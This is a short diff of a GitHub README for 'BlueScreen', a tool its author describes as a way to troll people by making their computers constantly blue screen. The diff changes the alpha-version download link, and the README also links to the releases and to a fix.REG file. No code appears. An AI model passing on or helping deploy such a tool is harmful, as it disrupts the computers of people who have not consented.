@@ -1,4 +1,4 @@
-[Alpha Version (sometimes untested and unstable)](https://codeload.github.com/harryaldwithjarryald/BlueScreen/zip/refs/heads/main)
+[Alpha Version (sometimes untested and unstable)](https://github.com/harryaldwithjarryald/BlueScreen/archive/refs/heads/main.zip)
 <br>
 [All Release Versions](https://github.com/harryaldwithjarryald/BlueScreen/releases)
 # A simple OPEN SOURCE AND LESS THAN 1MB tool to troll people with causing their computer to contantly blue screen and includes a fix ([fix.REG](https://github.com/harryaldwithjarryald/BlueScreen/releases/download/standalone/fix.REG))
